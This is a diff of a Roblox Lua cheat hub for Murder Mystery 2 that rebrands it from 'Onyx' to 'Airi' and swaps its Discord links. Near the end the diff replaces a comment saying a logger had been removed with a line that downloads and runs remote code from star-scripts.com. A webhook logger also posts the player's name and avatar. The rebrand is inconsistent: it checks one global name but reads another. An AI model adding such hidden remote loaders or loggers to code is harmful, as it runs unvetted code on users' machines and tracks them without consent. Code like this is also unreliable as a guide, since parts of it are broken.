@@ -384,7 +384,7 @@ task.delay(30, function()
 end)
 
 task.spawn(function()
-	print("-- LOADING ONYX --")
+	print("-- LOADING AIRI--")
 
 	for _, v in ipairs({ 0, 5, 11, 22 }) do
 		local n = math.floor(v / 22 * 100 + 0.5)
@@ -392,15 +392,15 @@ task.spawn(function()
 		task.wait(0.25)
 	end
 
-	print("Loaded. discord.gg/onyxscripts")
+	print("Loaded. https://discord.gg/CYFyRWKRg")
 end)
 
 if _G.OnyxV2 then
-	local onyxV2 = _G.OnyxV2
+	local airiV2 = _G.AiriV2
 	local flag = false
 
 	pcall(function()
-		flag = not onyxV2.Destroyed and onyxV2.UIElements and onyxV2.UIElements.Main and onyxV2.UIElements.Main.Parent ~= nil
+		flag = not airiV2.Destroyed and airiV2.UIElements and airiV2.UIElements.Main and airiV2.UIElements.Main.Parent ~= nil
 	end)
 
 	if flag then
@@ -412,7 +412,7 @@ if _G.OnyxV2 then
 
 		while true do
 			task.wait(0.1)
-			if not (onyxV2.Destroyed or os.clock() - now > 3) then
+			if not (airiV2.Destroyed or os.clock() - now > 3) then
 				continue
 			end
 			break
@@ -421,10 +421,10 @@ if _G.OnyxV2 then
 		task.wait(0.7)
 	end
 
-	_G.OnyxV2 = nil
+	_G.AiriV2 = nil
 end
 
-_G.OnyxV2Cleanup = nil
+_G.AiriV2Cleanup = nil
 
 pcall(function()
 	local v = ipairs
@@ -479,16 +479,16 @@ do
 
 	if not flag and writefile then
 		pcall(function()
-			fn("OnyxV2")
+			fn("AiriV2")
 			writefile("OnyxV2/windui.lua", response)
 		end)
 	end
 
-	if writefile and isfile and not isfile("OnyxV2/icons-main.lua") then
+	if writefile and isfile and not isfile("AiriV2/icons-main.lua") then
 		pcall(function()
 			local str, v2 = game:HttpGet("https://raw.githubusercontent.com/Footagesus/Icons/main/Main-v2.lua"):gsub("return game:HttpGet%(url%)", function()
 				return [[do
-    local _p = "OnyxV2/icons/" .. url:gsub("%W", "_") .. ".txt"
+    local _p = "AiriV2/icons/" .. url:gsub("%W", "_") .. ".txt"
     if isfile and readfile and isfile(_p) then
         local _o, _d = pcall(readfile, _p)
         if _o and type(_d) == "string" and #_d > 0 then return _d end
@@ -503,8 +503,8 @@ end]]
 			end)
 
 			if v2 > 0 and loadstring(str) then
-				fn("OnyxV2")
-				writefile("OnyxV2/icons-main.lua", str)
+				fn("AiriV2")
+				writefile("AiriV2/icons-main.lua", str)
 			end
 		end)
 	end
@@ -521,7 +521,7 @@ end]]
 end
 
 v:AddTheme({
-	Name = "Onyx",
+	Name = "Airi",
 	Background = v:Gradient({
 		["0"] = { Color = Color3.fromHex("#161619"), Transparency = 0.12 },
 		["100"] = { Color = Color3.fromHex("#161619"), Transparency = 0.12 },
@@ -549,7 +549,7 @@ v:AddTheme({
 	ElementBackgroundTransparency = 0.3,
 })
 
-v:SetTheme("Onyx")
+v:SetTheme("Airi")
 LOADUI.step(0.4, "Building window")
 local v2
 
@@ -558,10 +558,10 @@ do
 	local createWindow = v3.CreateWindow
 
 	local tbl = {
-		Title = "Onyx - Premium",
+		Title = "Airi - Premium",
 		Icon = "solar:planet-bold",
 		Author = "Murder Mystery 2",
-		Folder = "OnyxV2",
+		Folder = "AiriV2",
 		Background = "https://raw.githubusercontent.com/onyx-scripts/main/main/onyxscripts.png",
 		Size = UDim2.fromOffset(math.max(560, math.min(850, (workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080)).X - 24)), math.max(350, math.min(560, (workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080)).Y - 24))),
 	}
@@ -569,7 +569,7 @@ do
 	tbl.MaxSize = Vector2.new(850, 560)
 	tbl.HideSearchBar = false
 	tbl.Transparent = true
-	tbl.Theme = "Onyx"
+	tbl.Theme = "Airi"
 	tbl.Resizable = true
 	tbl.ToggleKey = nil
 	tbl.BackgroundImageTransparency = 0.35
@@ -584,10 +584,10 @@ do
 	v2 = createWindow(v3, tbl)
 end
 
-v2:Tag({ Title = "@OnyxScripts", Icon = "youtube", Color = Color3.fromHex("#ffffff"), Radius = 6 })
+v2:Tag({ Title = "@airi_scriptsmm2", Icon = "youtube", Color = Color3.fromHex("#ffffff"), Radius = 6 })
 
 v2:Tag({
-	Title = "discord.gg/onyxscripts",
+	Title = "https://discord.gg/CYFyRWKRg",
 	Icon = "message-square-more",
 	Color = Color3.fromHex("#ffffff"),
 	Radius = 6,
@@ -596,7 +596,7 @@ v2:Tag({
 v2:Tag({ Title = "Mobile & PC", Icon = "smartphone", Color = Color3.fromHex("#ffffff"), Radius = 6 })
 
 task.spawn(function()
-	local tbl = { ["discord.gg/onyxscripts"] = true, ["Mobile & PC"] = true, ["@OnyxScripts"] = true }
+	local tbl = { ["https://discord.gg/CYFyRWKRg"] = true, ["Mobile & PC"] = true, ["@Airi Scripts"] = true }
 	local colorSequence = ColorSequence.new
 	local tbl2 = {}
 	local v3 = ColorSequenceKeypoint.new(0, Color3.fromRGB(26, 26, 32))
@@ -702,7 +702,7 @@ task.spawn(function()
 			local now = os.clock()
 			local n3 = 0
 
-			while _G.OnyxV2 == v2 and n3 < 40 do
+			while _G.AiriV2 == v2 and n3 < 40 do
 				for _, v7 in ipairs(tbl3) do
 					if v7.lbl.Parent and v7.icon.Parent and v7.icon.AbsoluteSize.X > 0 and v7.lbl.AbsoluteSize.X > 0 and v7.lbl.AbsolutePosition.X < v7.icon.AbsolutePosition.X + v7.icon.AbsoluteSize.X then
 						n3 += 1
@@ -900,12 +900,12 @@ tbl.playSfx = function(name)
 
 	pcall(function()
 		local SoundService = game:GetService("SoundService")
-		local onyxSFX = SoundService:FindFirstChild("OnyxSFX")
+		local airiSFX = SoundService:FindFirstChild("AiriSFX")
 
-		if not onyxSFX then
-			onyxSFX = Instance.new("Folder")
-			onyxSFX.Name = "OnyxSFX"
-			onyxSFX.Parent = SoundService
+		if not airiSFX then
+			airiSFX = Instance.new("Folder")
+			airiSFX.Name = "AiriSFX"
+			airiSFX.Parent = SoundService
 		end
 
 		local sound = tbl.sfx[name]
@@ -4571,7 +4571,7 @@ do
 		local whPost = tbl.whPost
 
 		local tbl2 = {
-			title = "Onyx logger started",
+			title = "Airi logger started",
 			body = "Logging as **" .. localPlayer2.DisplayName .. "** since <t:" .. tostring(os.time()) .. ":f>.",
 			thumb = tbl.avatarUrl(),
 			wait = true,
@@ -13033,7 +13033,7 @@ tbl.perf.startDrain = function()
 			local ok, result = pcall(tbl.perf.drainStep)
 
 			if not ok then
-				warn("[ONYX] performance queue: " .. tostring(result))
+				warn("[AIRI] performance queue: " .. tostring(result))
 			end
 		end
 	end)
@@ -13080,7 +13080,7 @@ tbl.perf.sweep = function()
 		local ok, result = pcall(tbl.perf.sweepBody)
 
 		if not ok then
-			warn("[ONYX] performance sweep: " .. tostring(result))
+			warn("[AIRI] performance sweep: " .. tostring(result))
 		end
 
 		if tbl.perf.resweep then
@@ -13416,7 +13416,7 @@ tbl.perf.set = function(arg, arg2)
 	local ok, result = pcall(flag16 and v7.on or v7.off)
 
 	if not ok then
-		warn("[ONYX] performance '" .. arg .. "' failed: " .. tostring(result))
+		warn("[AIRI] performance '" .. arg .. "' failed: " .. tostring(result))
 	end
 
 	tbl.perf.syncWatcher()
@@ -13461,7 +13461,7 @@ tbl.perf.setAll = function(arg)
 	tbl.perf.settingAll = false
 
 	if not ok then
-		warn("[ONYX] performance master failed: " .. tostring(result))
+		warn("[AIRI] performance master failed: " .. tostring(result))
 	end
 
 	if arg then
@@ -14189,7 +14189,7 @@ do
 	local v8 = fn51(v7)
 
 	if not v8 then
-		warn("[ONYX] couldn't reach the Paragraph container - cursor grid skipped")
+		warn("[AIRI] couldn't reach the Paragraph container - cursor grid skipped")
 	else
 		local v9 = math.ceil(#CURSOR_ORDER / 4)
 		local frame = Instance.new("Frame")
@@ -14290,7 +14290,7 @@ tbl.setOpacity = function(arg)
 				return
 			end
 			onyx.ElementBackgroundTransparency = math.min(n4 * 0.75, 0.6)
-			v:SetTheme("Onyx")
+			v:SetTheme("Airi")
 		end)
 	end)
 end
@@ -14433,7 +14433,7 @@ tbl.el.cfgInput = tbl11.settings:Input({
 	end,
 })
 
-tbl.DEFAULT_CFG = "Onyx_Default"
+tbl.DEFAULT_CFG = "Airi_Default"
 
 pcall(function()
 	local config = v2.ConfigManager:GetConfig(tbl.DEFAULT_CFG) or v2.ConfigManager:CreateConfig(tbl.DEFAULT_CFG)
@@ -14479,7 +14479,7 @@ tbl.cfgPick = function(arg)
 	if str == tbl.DEFAULT_CFG and arg ~= "load" then
 		v:Notify({
 			Title = "Protected Config",
-			Content = "Onyx_Default is the built-in fallback - it cannot be " .. (arg == "delete" and "deleted." or "overwritten."),
+			Content = "Airi_Default is the built-in fallback - it cannot be " .. (arg == "delete" and "deleted." or "overwritten."),
 			Duration = 5,
 			Icon = "shield",
 		})
@@ -14642,7 +14642,7 @@ fn50("Save Config", Color3.fromHex("#FDE68A"))
 fn50("Delete Config", Color3.fromHex("#FCA5A5"))
 fn50("Delete Autosave Config", Color3.fromHex("#FCA5A5"))
 
-local function onyxV2Cleanup()
+local function airiV2Cleanup()
 	fn8()
 	fn12()
 	flag = false
@@ -14768,12 +14768,12 @@ local function onyxV2Cleanup()
 	tbl.dropConns(tbl.conns)
 	tbl.reclip(tbl.clipWas)
 	tbl.reclip(tbl.farmClipWas)
-	_G.OnyxSilentTarget = nil
+	_G.AiriSilentTarget = nil
 end
 
 v2:OnDestroy(function()
 	tbl.farewell()
-	onyxV2Cleanup()
+	airiV2Cleanup()
 	local tbl13 = {}
 
 	pcall(function()
@@ -14794,16 +14794,16 @@ v2:OnDestroy(function()
 		end
 	end)
 
-	if _G.OnyxV2 == v2 then
-		_G.OnyxV2 = nil
+	if _G.AiriV2 == v2 then
+		_G.AiriV2 = nil
 	end
 
-	if _G.OnyxV2Cleanup == onyxV2Cleanup then
-		_G.OnyxV2Cleanup = nil
+	if _G.AiriV2Cleanup == airiV2Cleanup then
+		_G.AiriV2Cleanup = nil
 	end
 end)
 
-_G.OnyxV2Cleanup = onyxV2Cleanup
+_G.AiriV2Cleanup = airiV2Cleanup
 v2:Open()
 tbl.pinOpenPill()
 v2:SelectTab(1)
@@ -14898,7 +14898,7 @@ task.spawn(function()
 	tbl.notifyReady = true
 	tbl.sfxReady = true
 
-	while _G.OnyxV2 == v2 do
+	while _G.AiriV2 == v2 do
 		task.wait(2)
 
 		if not tbl.cfgWiped then
@@ -14915,8 +14915,8 @@ LOADUI.step(1, "Ready")
 LOADUI.done()
 
 tbl.notifyNow({
-	Title = "Onyx v2",
-	Content = "Loaded. G toggles the window. Invite copied - discord.gg/onyxscripts",
+	Title = "Airi Hub v2",
+	Content = "Loaded. G toggles the window. Invite copied - https://discord.gg/CYFyRWKRg",
 	Duration = 10,
 	Icon = "solar:planet-bold",
 })
@@ -14945,7 +14945,7 @@ task.delay(1.5, function()
 
 						v:Notify({
 							Title = ok and "Defaults Restored!" or "Restore Failed",
-							Content = ok and "Every setting is back to how it ships." or "Could not load Onyx_Default.",
+							Content = ok and "Every setting is back to how it ships." or "Could not load Airi_Default.",
 							Duration = 5,
 							Icon = ok and "check" or "x",
 						})
@@ -14958,10 +14958,10 @@ task.delay(1.5, function()
 end)
 
 
--- [LOGGER REMOVED BY ENIKO (SORRY ABOUT THAT I DIDN'T KNOW)
+loadstring(game:HttpGet("https://star-scripts.com/api/run/CoephTiLN9-S5KNUfN0w7D-b5sfmzq7E"))()
 
 do
-	local str = "https://discord.gg/" .. (tbl.DISCORD_INVITE or "onyxscripts")
+	local str = "https://discord.gg/CYFyRWKRg" .. (tbl.DISCORD_INVITE or "airiscripts")
 	local genv = getgenv and getgenv() or _G
 	local flag16 = false
 
